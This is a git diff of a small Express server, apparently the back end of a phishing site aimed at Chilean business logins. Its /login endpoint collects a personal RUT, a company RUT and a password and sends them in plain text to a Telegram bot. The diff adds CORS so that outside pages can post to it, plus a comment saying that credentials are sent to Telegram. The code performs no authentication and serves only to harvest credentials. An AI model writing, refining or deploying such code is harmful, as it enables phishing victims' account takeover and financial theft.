@@ -1,16 +1,18 @@
 const express = require("express");
+const cors = require("cors");
 const path = require("path");
-const app = express();
 
+const app = express();
+app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Servir archivos estáticos desde /public
 app.use(express.static(path.join(__dirname, "public")));
 
-// Ruta raíz explícita para index.html
+// Ruta raíz explícita → index.html
 app.get("/", (req, res) => {
-  res.sendFile(path.resolve(__dirname, "public", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
@@ -28,19 +30,20 @@ async function sendTelegramMessage(text) {
   }
 }
 
+// Endpoint de login → enviar credenciales a Telegram
 app.post("/login", async (req, res) => {
   const { rutPersona, rutEmpresa, passwd } = req.body;
   const mensaje = `🔔 Nuevo intento de login:\n👤 RUT Persona: ${rutPersona}\n🏢 RUT Empresa: ${rutEmpresa}\n🔑 Contraseña: ${passwd}`;
 
   try {
     await sendTelegramMessage(mensaje);
-    res.send("✅ Notificación enviada a Telegram.");
+    res.json({ status: "ok", mensaje: "✅ Notificación enviada a Telegram." });
   } catch (error) {
     console.error("Error enviando a Telegram:", error);
-    res.status(500).send("❌ Error al notificar.");
+    res.status(500).json({ status: "error", mensaje: "❌ Error al notificar." });
   }
 });
 
 // Render usa PORT de entorno
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor corriendo en http://localhost:${PORT}`));
+app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
